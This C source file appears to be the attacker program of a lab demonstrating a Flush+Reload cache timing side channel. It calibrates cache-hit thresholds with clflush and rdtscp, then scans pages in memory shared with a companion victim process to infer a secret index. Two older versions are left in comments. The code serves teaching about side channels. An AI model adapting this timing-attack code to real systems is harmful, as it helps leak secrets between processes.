// // #include "../shared/shared_mem.h"

// // static uint64_t measure_access_time(volatile unsigned char *addr) {
// //     uint64_t start, end;
// //     volatile unsigned char value;

// //     start = read_timer();
// //     value = *addr;
// //     end = read_timer();

// //     (void)value;
// //     return end - start;
// // }

// // int main(void) {
// //     unsigned char *shared_mem = map_shared_region(0);

// //     const uint64_t threshold = 200;
// //     int best_index = -1;
// //     uint64_t best_time = UINT64_MAX;

// //     printf("Attacker started.\n");
// //     printf("Looking for the fastest page access in shared memory.\n");
// //     printf("Threshold currently set to: %" PRIu64 "\n", threshold);
// //     printf("Press Ctrl+C to stop.\n\n");

// //     while (1) {
// //         best_index = -1;
// //         best_time = UINT64_MAX;

// //         for (int i = 0; i < ARRAY_SIZE; i++) {
// //             flush_memory(&shared_mem[i * STRIDE]);
// //         }

// //         memory_fence();
// //         usleep(2000);

// //         for (int i = 0; i < ARRAY_SIZE; i++) {
// //             uint64_t access_time = measure_access_time(&shared_mem[i * STRIDE]);

// //             if (access_time < best_time) {
// //                 best_time = access_time;
// //                 best_index = i;
// //             }
// //         }

// //         if (best_index >= 0) {
// //             printf("Fastest index: %3d | access time: %10" PRIu64 " | guessed secret: %3d",
// //                    best_index, best_time, best_index);

// //             if (best_time < threshold) {
// //                 printf("  <-- likely cached");
// //             }

// //             if (best_index == SECRET) {
// //                 printf("  <-- matches expected secret");
// //             }

// //             printf("\n");
// //         }

// //         usleep(500000);
// //     }

// //     unmap_shared_region(shared_mem);
// //     return 0;
// // }

// #include <stdio.h>
// #include <stdlib.h>
// #include <stdint.h>
// #include <limits.h>
// #include <time.h>
// #include <fcntl.h>
// #include <sys/mman.h>
// #include <sys/stat.h>
// #include <unistd.h>
// #include "../shared/shared_mem.h"

// static inline uint64_t portable_time_access(volatile unsigned char *addr) {
//     clock_t start = clock();
//     volatile unsigned char value = *addr;
//     (void)value;
//     clock_t end = clock();
//     return (uint64_t)(end - start);
// }

// int main(void) {
//     int shm_fd = shm_open(SHM_NAME, O_RDWR, 0666);
//     if (shm_fd == -1) {
//         perror("shm_open");
//         fprintf(stderr, "Run victim first so shared memory exists.\n");
//         return 1;
//     }

//     volatile unsigned char *shared_mem = mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
//     if (shared_mem == MAP_FAILED) {
//         perror("mmap");
//         close(shm_fd);
//         return 1;
//     }

//     printf("Attacker started.\n");
//     printf("Attached to shared memory: %s\n", SHM_NAME);
//     printf("Scanning 256 pages with stride %d.\n", STRIDE);
//     printf("Press Ctrl+C to stop.\n\n");

//     while (1) {
//         int fastest_index = -1;
//         uint64_t best_time = ULLONG_MAX;

//         for (int i = 0; i < ARRAY_SIZE; i++) {
//             volatile unsigned char *addr = shared_mem + ((size_t)i * STRIDE);
//             uint64_t t = portable_time_access(addr);
//             if (t < best_time) {
//                 best_time = t;
//                 fastest_index = i;
//             }
//         }

//         if (fastest_index >= 0) {
//             printf("Fastest page index: %d | Estimated secret: %d | Measured time: %llu\n",
//                    fastest_index, fastest_index, (unsigned long long)best_time);
//         }

//         usleep(500000);
//     }
// }

#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <immintrin.h>
#include <limits.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include "../shared/shared_mem.h"

#define CALIBRATION_ROUNDS 1000
#define ATTACK_ROUNDS 40
#define TOP_RESULTS 3
#define DEFAULT_WINDOW_NS 200000L
#define DEFAULT_SLEEP_NS 50000000L

typedef struct {
    uint64_t total_cycles;
    uint64_t min_cycles;
    uint64_t max_cycles;
    int hits_below_threshold;
} page_stats_t;

static volatile uint8_t *shared_mem = NULL;
static int shm_fd = -1;
static volatile sig_atomic_t keep_running = 1;

static void handle_signal(int sig) {
    (void)sig;
    keep_running = 0;
}

static inline void serialize_cpu(void) {
    _mm_lfence();
}

static inline void flush_line(volatile uint8_t *addr) {
    _mm_clflush((const void *)addr);
}

static inline uint64_t measure_access_time(volatile uint8_t *addr) {
    unsigned int aux = 0;
    uint64_t start, end;

    serialize_cpu();
    start = __rdtscp(&aux);

    (void)*addr;

    serialize_cpu();
    end = __rdtscp(&aux);
    serialize_cpu();

    return end - start;
}

static void flush_all_pages(void) {
    for (int i = 0; i < PAGE_COUNT; i++) {
        flush_line(&shared_mem[i * STRIDE]);
    }
    serialize_cpu();
}

static uint64_t average_cached_time(void) {
    uint64_t total = 0;
    volatile uint8_t *addr = &shared_mem[SECRET_INDEX];

    for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
        (void)*addr;
        serialize_cpu();
        total += measure_access_time(addr);
    }

    return total / CALIBRATION_ROUNDS;
}

static uint64_t average_flushed_time(void) {
    uint64_t total = 0;
    volatile uint8_t *addr = &shared_mem[SECRET_INDEX];

    for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
        flush_line(addr);
        serialize_cpu();
        total += measure_access_time(addr);
    }

    return total / CALIBRATION_ROUNDS;
}

static int derive_threshold(uint64_t cached_avg, uint64_t flushed_avg) {
    if (flushed_avg <= cached_avg) {
        return (int)(cached_avg + 20);
    }
    return (int)((cached_avg + flushed_avg) / 2);
}

static void sleep_ns(long nanoseconds) {
    struct timespec ts;
    ts.tv_sec = nanoseconds / 1000000000L;
    ts.tv_nsec = nanoseconds % 1000000000L;
    nanosleep(&ts, NULL);
}

static void reset_page_stats(page_stats_t stats[PAGE_COUNT]) {
    for (int i = 0; i < PAGE_COUNT; i++) {
        stats[i].total_cycles = 0;
        stats[i].min_cycles = UINT64_MAX;
        stats[i].max_cycles = 0;
        stats[i].hits_below_threshold = 0;
    }
}

static void update_top_candidates(const page_stats_t stats[PAGE_COUNT],
                                  int top_pages[TOP_RESULTS],
                                  uint64_t top_scores[TOP_RESULTS]) {
    for (int k = 0; k < TOP_RESULTS; k++) {
        top_pages[k] = -1;
        top_scores[k] = UINT64_MAX;
    }

    for (int i = 0; i < PAGE_COUNT; i++) {
        uint64_t avg = stats[i].total_cycles / ATTACK_ROUNDS;

        for (int k = 0; k < TOP_RESULTS; k++) {
            if (avg < top_scores[k]) {
                for (int j = TOP_RESULTS - 1; j > k; j--) {
                    top_scores[j] = top_scores[j - 1];
                    top_pages[j] = top_pages[j - 1];
                }
                top_scores[k] = avg;
                top_pages[k] = i;
                break;
            }
        }
    }
}

int main(void) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    shm_fd = shm_open(SHM_NAME, O_RDWR, 0666);
    if (shm_fd < 0) {
        fprintf(stderr, "shm_open failed for %s: %s\n", SHM_NAME, strerror(errno));
        fprintf(stderr, "Start victim first so the shared memory exists.\n");
        return EXIT_FAILURE;
    }

    shared_mem = mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shared_mem == MAP_FAILED) {
        perror("mmap failed");
        close(shm_fd);
        return EXIT_FAILURE;
    }

    page_stats_t stats[PAGE_COUNT];
    int winner_counts[PAGE_COUNT];
    memset(winner_counts, 0, sizeof(winner_counts));

    printf("Attacker started.\n");
    printf("Attached to shared memory: %s\n", SHM_NAME);
    printf("Scanning %d pages with stride %d.\n", PAGE_COUNT, STRIDE);
    printf("Running calibration for cached vs flushed access...\n");

    uint64_t cached_avg = average_cached_time();
    uint64_t flushed_avg = average_flushed_time();
    int threshold = derive_threshold(cached_avg, flushed_avg);

    printf("Calibration complete.\n");
    printf("Average cached access : %llu cycles\n", (unsigned long long)cached_avg);
    printf("Average flushed access: %llu cycles\n", (unsigned long long)flushed_avg);
    printf("Chosen threshold      : %d cycles\n", threshold);
    printf("Attack rounds per scan: %d\n", ATTACK_ROUNDS);
    printf("Press Ctrl+C to stop.\n\n");

    while (keep_running) {
        reset_page_stats(stats);

        for (int round = 0; round < ATTACK_ROUNDS; round++) {
            flush_all_pages();
            sleep_ns(DEFAULT_WINDOW_NS);

            for (int i = 0; i < PAGE_COUNT; i++) {
                uint64_t cycles = measure_access_time(&shared_mem[i * STRIDE]);
                stats[i].total_cycles += cycles;

                if (cycles < stats[i].min_cycles) {
                    stats[i].min_cycles = cycles;
                }

                if (cycles > stats[i].max_cycles) {
                    stats[i].max_cycles = cycles;
                }

                if ((int)cycles <= threshold) {
                    stats[i].hits_below_threshold++;
                }
            }
        }

        int top_pages[TOP_RESULTS];
        uint64_t top_scores[TOP_RESULTS];
        update_top_candidates(stats, top_pages, top_scores);

        int winner = top_pages[0];
        if (winner >= 0) {
            winner_counts[winner]++;

            int total_wins = 0;
            for (int i = 0; i < PAGE_COUNT; i++) {
                total_wins += winner_counts[i];
            }

            double confidence = total_wins
                ? (100.0 * winner_counts[winner] / total_wins)
                : 0.0;

            printf("Top candidates: ");
            for (int k = 0; k < TOP_RESULTS; k++) {
                if (top_pages[k] >= 0) {
                    uint64_t avg = stats[top_pages[k]].total_cycles / ATTACK_ROUNDS;
                    printf("#%d page=%d avg=%llu hits=%d  ",
                           k + 1,
                           top_pages[k],
                           (unsigned long long)avg,
                           stats[top_pages[k]].hits_below_threshold);
                }
            }
            printf("\n");

            printf("Winner page index: %d | Estimated secret: %d | Avg cycles: %llu | Min: %llu | Max: %llu | Confidence: %.2f%%\n\n",
                   winner,
                   winner,
                   (unsigned long long)(stats[winner].total_cycles / ATTACK_ROUNDS),
                   (unsigned long long)stats[winner].min_cycles,
                   (unsigned long long)stats[winner].max_cycles,
                   confidence);
        }

        sleep_ns(DEFAULT_SLEEP_NS);
    }

    printf("Attacker stopping.\n");

    if (shared_mem && shared_mem != MAP_FAILED) {
        munmap((void *)shared_mem, SHM_SIZE);
    }

    if (shm_fd >= 0) {
        close(shm_fd);
    }

    return EXIT_SUCCESS;
}